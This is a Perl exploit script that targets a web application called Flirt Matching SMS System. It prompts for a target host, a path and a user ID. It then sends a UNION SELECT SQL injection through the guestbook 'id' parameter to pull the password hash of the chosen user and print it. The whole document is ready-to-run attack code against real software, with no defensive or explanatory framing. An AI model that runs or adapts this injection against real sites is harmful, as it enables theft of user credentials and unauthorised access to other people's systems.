#!usr\bin\perl
#
#
##################################################
# Modules                                        #
#------------------------------------------------#    
use strict;               # Better coding.       #
use warnings;             # Useful warnings.     #
use LWP::Simple;          # procedureal interface#
##################################################
print "
##################################################
#            4004-Security-Project               #
##################################################
#    Flirt Matching SMS System SQL Injection     #
#                   Exploit                      #
#            Using Host+Path+Userid              #
#              www.demo.com /flirt/ 1            #
#  Discovered and vulnerability by Easy Laster   #
#                coded by Easy Laster            #
##################################################
\a\n";
my($host,$path,$userid,$request);
my($first,$block,$error,$dir);
$block = "
##################################################\n";
$error = "Exploit failed";
  print "$block";
    print q(Target www.demo.com->);
    chomp($host =<STDIN>);
    if ($host eq""){
    die "$error\a\n"};
    print "$block";
          print q(Path /path/ ->);
          chomp($path =<STDIN>);
          if ($path eq""){
          die "$error\a\n";}
                 print "$block";
                 print q(userid->);
                  chomp($userid =<STDIN>);
                      if ($userid eq""){
                      die "$error\a\n";}
                      print "$block";
                         $dir = "index.php?site=guestbook&id=";
                         print "<~> Exploiting...\n";
                         $host = "http://".$host.$path;
                           print "<~> Connecting...\n";
                           $request = get($host.$dir."9999999999+union+select+1,2,3,4,concat(password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+users+where+id=".$userid."--");
                       $first = rindex($request,"Gästebuch von");
                       if ($first != -1)
                       {
               print "<~> Exploiting...\n";
               print "$block\n";
         $request = substr($request, $first+14, 34);
         print "<~> Hash = $request\n\r\n\a";
       }
       else
     {
   print "<~> $error";
}
